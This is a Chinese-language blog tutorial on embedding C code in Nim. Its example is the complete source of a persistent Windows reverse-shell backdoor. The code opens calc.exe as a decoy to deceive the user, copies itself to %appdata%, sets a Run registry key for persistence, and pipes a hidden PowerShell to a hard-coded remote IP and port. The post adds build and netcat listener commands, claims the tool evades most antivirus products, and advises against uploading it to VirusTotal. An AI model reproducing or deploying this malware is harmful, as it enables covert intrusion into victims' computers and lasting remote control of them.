# nim 嵌入C 代码（nim学习系列）

假设手头上有一份现成的 C 代码，比如 [PersistentCReverseShell](https://github.com/1captainnemo1/PersistentCReverseShell) ，这是一个用 C 语言实现的 windows 反弹 shell 后门，请不要上传到 www.virustotal.com 进行扫描。如何快速利用这段代码呢，好在 nim 提供了 [Emit pragma](https://nim-lang.org/docs/manual.html#implementation-specific-pragmas-emit-pragma) ，让我们可以直接在 nim 中嵌入 C 代码。

PersistentCReverseShell 的介绍：  

> * 用 C 语言实现
> * 支持任意 windows 发行版
> * 通过注册表实现自启动
> * 反弹 powershell 至远程服务器
> * 在前台打开一个诱饵应用程序（calc.exe）以欺骗用户
> * 作者说可免杀 98% 的杀毒软件（本地测试 Windows defender 和 Avast 通过）

### 源代码 reverse.nim

编译命令：nim c -d:release --opt:size --passL:-lws2_32 reverse.nim  

可根据需要修改IP地址和端口号。

``` reverse.nim
#[
    Author: StudyCat
    Blog: https://www.cnblogs.com/studycat
    Github: https://github.com/StudyCat404/myNimExamples
    License: BSD 3-Clause
    Referer: https://github.com/1captainnemo1/PersistentCReverseShell
]#
#import os, strutils

when not defined(c):
    {.error: "Must be compiled in c mode"}

{.emit: """
// AUTHOR : #Captain_Nemo
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEF_BUFF 2048

void rsh(char* server, int Port) 
{
    while(1) 
  {
     

     WSADATA wsaData;
     SOCKET Winsock;
     struct sockaddr_in address;
     char Rec_dat[DEF_BUFF];
     STARTUPINFO process_startup;
     PROCESS_INFORMATION p_info;
  
	WSAStartup(MAKEWORD(2,2), &wsaData);
	Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

    
	address.sin_family = AF_INET;
	address.sin_port = htons(Port);
	address.sin_addr.s_addr =inet_addr(server);
    
	WSAConnect(Winsock,(SOCKADDR*)&address, sizeof(address),NULL,NULL,NULL,NULL);
	if (WSAGetLastError() == 0) 
        {

		memset(&process_startup, 0, sizeof(process_startup));
                //char proc[] = "cmd.exe";
                char proc[] = "powershell.exe -WindowStyle Hidden";
		process_startup.cb=sizeof(process_startup);
		process_startup.dwFlags=STARTF_USESTDHANDLES;
		process_startup.hStdInput = process_startup.hStdOutput = process_startup.hStdError = (HANDLE)Winsock;
		CreateProcess(NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL, &process_startup, &p_info);
               // WaitForSingleObject(p_info.hProcess, INFINITE);
               // CloseHandle(p_info.hProcess);
               // CloseHandle(p_info.hThread);
                //memset(Rec_dat, 0, sizeof(Rec_dat));
                //int Rec_code = recv(Winsock, Rec_dat, DEF_BUFF, 0);
               // if (Rec_code <= 0) 
               // {
                 //   closesocket(Winsock);
                  //  WSACleanup();
                  //  continue;
               // } // end if 
               // if (strcmp(Rec_dat, "exit\n") == 0) 
                //{
                    exit(0);
                } // end if
		exit(0);
      } // end while 
   } // end function rsh 
//int PersistentCReverseShell(char *h, int p) 
int PersistentCReverseShell() 
 {
        char h[] = "172.20.10.4";
        int p = 8080;
        system("start C:\\WINDOWS\\System32\\calc.exe"); // fire decoy
        system("cmd /c copy .\\reverse.exe %appdata%");  // copy malware to appdata
        system("cmd /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Secure\" /t REG_SZ /F /D \"%appdata%\\reverse.exe"); //add registry persistence 
        rsh(h, p);   // call rsh function
        return 0;
 } // end main 
""".}
#proc PersistentCReverseShell(ip: cstring, port: int): int
proc PersistentCReverseShell(): int
    {.importc: "PersistentCReverseShell", nodecl.}
    
when isMainModule:
    discard PersistentCReverseShell()
    #discard PersistentCReverseShell(paramStr(1), parseInt(paramStr(2)))
```



### 本地测试

kali 使用 netcat 监听 8080端口：  

nc -vv -l -p 8080

然后执行编译成功的 reverse.exe 即可。关闭 calc.exe 反弹的shell 也不会中断，因为这是两个不同的进程。

![截图1](https://files-cdn.cnblogs.com/files/StudyCat/PersistentCReverseShell01.bmp)